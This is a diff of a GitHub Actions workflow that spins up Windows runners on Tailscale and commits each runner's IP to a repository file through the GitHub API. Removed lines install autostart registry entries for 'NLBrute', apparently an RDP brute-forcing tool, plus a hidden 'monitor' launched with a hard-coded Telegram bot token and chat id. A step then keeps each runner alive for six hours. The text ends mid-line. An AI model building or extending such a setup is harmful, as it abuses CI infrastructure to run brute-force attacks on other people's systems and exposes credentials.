@@ -120,93 +120,128 @@ jobs:
           echo "TS_IP=$ts_ip" >> $env:GITHUB_ENV
           Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
 
-      - name: 6.5. Save Tailscale IP to vpmaj Repo
+      - name: 6.5. Save Tailscale IP to vpmaj Repo (Using curl)
         env:
           GITHUB_TOKEN: ${{ github.token }}
-        shell: powershell
+          TS_IP: ${{ env.TS_IP }} # Explicitly pass TS_IP to this step's env for safety
+          MATRIX_ID: ${{ matrix.server_id }}
+        shell: bash # Using bash for cleaner curl syntax and JSON handling
         run: |
-          $ip = $env:TS_IP
-          $repo = "roozbeh017-hub/vpmaj"
-          $branch = "main"
-          $filePath = "fullips.txt"
-          $message = "Add Tailscale IP for server-${{ matrix.server_id }}: $ip"
-          
-          # Verify token is present
-          if (-not $env:GITHUB_TOKEN) {
-              Write-Error "GITHUB_TOKEN is not set. Cannot proceed."
+          set -e
+
+          REPO="roozbeh017-hub/vpmaj"
+          BRANCH="main"
+          FILE_PATH="fullips.txt"
+          IP="$TS_IP"
+          TOKEN="$GITHUB_TOKEN"
+          MSG="Add Tailscale IP for server-$MATRIX_ID: $IP"
+
+          if [ -z "$IP" ]; then
+            echo "ERROR: TS_IP is empty. Cannot proceed."
+            exit 1
+          fi
+
+          if [ -z "$TOKEN" ]; then
+            echo "ERROR: GITHUB_TOKEN is empty."
+            exit 1
+          fi
+
+          # 1. Try to fetch existing file
+          # We use -sS to be silent but show errors, and -w to get the http_code
+          RESPONSE=$(curl -sS -w "\n%{http_code}" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/$REPO/contents/$FILE_PATH?ref=$BRANCH")
+
+          # Extract status code (last line)
+          HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
+          # Extract body (everything else)
+          BODY=$(echo "$RESPONSE" | sed '$d')
+
+          if [ "$HTTP_CODE" -eq 200 ]; then
+            echo "Found existing file. Extracting SHA and Content..."
+            # Parse JSON using jq (available on ubuntu-latest, but we are on windows. 
+            # GitHub Actions Windows runners have jq pre-installed? No, not always. 
+            # Let's use PowerShell for JSON parsing but curl for HTTP to be safe, 
+            # OR just use pure PowerShell but fix the previous issues.
+            # Actually, Windows runners DO have jq? Let's check. 
+            # If jq is not present, we fall back to PowerShell for parsing only.
+            if command -v jq &> /dev/null; then
+               SHA=$(echo "$BODY" | jq -r '.sha')
+               CONTENT_B64=$(echo "$BODY" | jq -r '.content')
+            else
+               # Fallback to PowerShell for parsing if jq is missing
+               SHA=$(powershell -Command "$b = '$BODY' | ConvertFrom-Json; $b.sha")
+               CONTENT_B64=$(powershell -Command "$b = '$BODY' | ConvertFrom-Json; $b.content")
+            fi
+            
+            # Decode existing content
+            EXISTING_CONTENT=$(echo -n "$CONTENT_B64" | base64 -d)
+            NEW_CONTENT="${EXISTING_CONTENT}"$'\n'"${IP}"
+          else
+            if [ "$HTTP_CODE" -eq 404 ]; then
+              echo "File does not exist (404). Creating new file."
+              NEW_CONTENT="$IP"
+              SHA=""
+            else
+              echo "ERROR: Unexpected HTTP response $HTTP_CODE"
+              echo "$BODY"
               exit 1
-          }
+            fi
+          fi
 
-          $headers = @{
-              "Authorization" = "Bearer $($env:GITHUB_TOKEN)"
-              "Accept" = "application/vnd.github.v3+json"
-              "User-Agent" = "GitHub Actions Workflow"
-          }
+          # 2. Prepare Payload
+          # Base64 encode the new content
+          NEW_CONTENT_B64=$(echo -n "$NEW_CONTENT" | base64 -w0)
           
-          $uriContent = "https://api.github.com/repos/$repo/contents/$filePath?ref=$branch"
-          $existingContent = ""
-          $sha = $null
-
-          try {
-              Write-Host "Checking for existing file at $uriContent"
-              $response = Invoke-RestMethod -Uri $uriContent -Headers $headers -Method Get
-              # If file exists, decode base64 content
-              $existingContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($response.content))
-              $sha = $response.sha
-              Write-Host "Found existing fullips.txt. Appending..."
+          # Create JSON payload
+          # If SHA exists, include it
+          if [ -n "$SHA" ]; then
+            PAYLOAD=$(cat <<EOF
+          {
+            "message": "$MSG",
+            "content": "$NEW_CONTENT_B64",
+            "branch": "$BRANCH",
+            "sha": "$SHA"
           }
-          catch {
-              # 404 is expected if the file doesn't exist yet
-              if ($_.Exception.Response.StatusCode.Value__ -eq 404) {
-                  Write-Host "No existing fullips.txt found (404). Creating new file..."
-              } else {
-                  Write-Warning "Unexpected error during GET request: $_"
-              }
+          EOF
+          )
+          else
+            PAYLOAD=$(cat <<EOF
+          {
+            "message": "$MSG",
+            "content": "$NEW_CONTENT_B64",
+            "branch": "$BRANCH"
           }
+          EOF
+          )
+          fi
 
-          # 2. Append new IP (ensure newline if content exists)
-          if ($existingContent) {
-              $newContent = $existingContent + "`n" + $ip
-          } else {
-              $newContent = $ip
-          }
+          echo "Sending payload to GitHub API..."
+          echo "$PAYLOAD"
 
-          # 3. Prepare commit payload
-          $payload = @{
-              message = $message
-              content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($newContent))
-              branch  = $branch
-          }
-          if ($sha) {
-              $payload["sha"] = $sha
-          }
+          # 3. Commit
+          # Use --data-binary to ensure the body is sent exactly as is
+          # Use -X PUT
+          COMMIT_RESPONSE=$(curl -sS -w "\n%{http_code}" \
+            -X PUT \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            -H "Content-Type: application/json" \
+            --data-binary "$PAYLOAD" \
+            "https://api.github.com/repos/$REPO/contents/$FILE_PATH")
 
-          # Convert to JSON string
-          $jsonBody = $payload | ConvertTo-Json -Depth 10
+          COMMIT_CODE=$(echo "$COMMIT_RESPONSE" | tail -n1)
+          COMMIT_BODY=$(echo "$COMMIT_RESPONSE" | sed '$d')
 
-          Write-Host "Preparing payload..."
-          Write-Host "Payload Size: $($jsonBody.Length) bytes"
-
-          # 4. Commit the file
-          $commitUri = "https://api.github.com/repos/$repo/contents/$filePath"
-          try {
-              $commitResponse = Invoke-RestMethod -Uri $commitUri -Headers $headers -Method Put -Body $jsonBody -ContentType "application/json"
-              
-              if ($commitResponse) {
-                  Write-Host "Successfully committed IP $ip to $repo/$filePath" -ForegroundColor Green
-                  Write-Host "Commit SHA: $($commitResponse.commit.sha)"
-              } else {
-                  Write-Error "Failed to commit IP to GitHub: Empty response"
-                  exit 1
-              }
-          } catch {
-              # Detailed error logging
-              $responseStream = $_.Exception.Response.GetResponseStream()
-              $reader = New-Object System.IO.StreamReader($responseStream)
-              $responseBody = $reader.ReadToEnd()
-              Write-Error "API Call Failed. Status: $($_.Exception.Response.StatusCode.Value__)`nResponse Body: $responseBody"
-              exit 1
-          }
+          if [ "$COMMIT_CODE" -ge 200 ] && [ "$COMMIT_CODE" -lt 300 ]; then
+            echo "Successfully committed IP $IP to $REPO/$FILE_PATH"
+            echo "Response: $COMMIT_BODY"
+          else
+            echo "ERROR: Commit failed with status $COMMIT_CODE"
+            echo "Response Body: $COMMIT_BODY"
+            exit 1
+          fi
 
       - name: 7. Deploy App & Setup Autostart
         shell: powershell
@@ -290,26 +325,4 @@ jobs:
               $exePath1 = $exeFile1.FullName
               $exeDir1 = Split-Path $exePath1 -Parent
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
-              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
-              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
-              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
-              Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
-          }
-
-          # APP 2 Setup
-          if ($exeFile2) {
-              $exePath2 = $exeFile2.FullName
-              $exeDir2 = Split-Path $exePath2 -Parent
-              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
-              $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
-              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
-              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
-              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-          }
-
-      - name: 8. Keep Server Alive (6 Hours)
-        run: |
-          for ($i = 1; $i -le 360; $i++) {
-            Start-Sleep -Seconds 60
-            Write-Host "[Server ${{ matrix.server_id }}] Running..."
-          }
+              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'Wsh
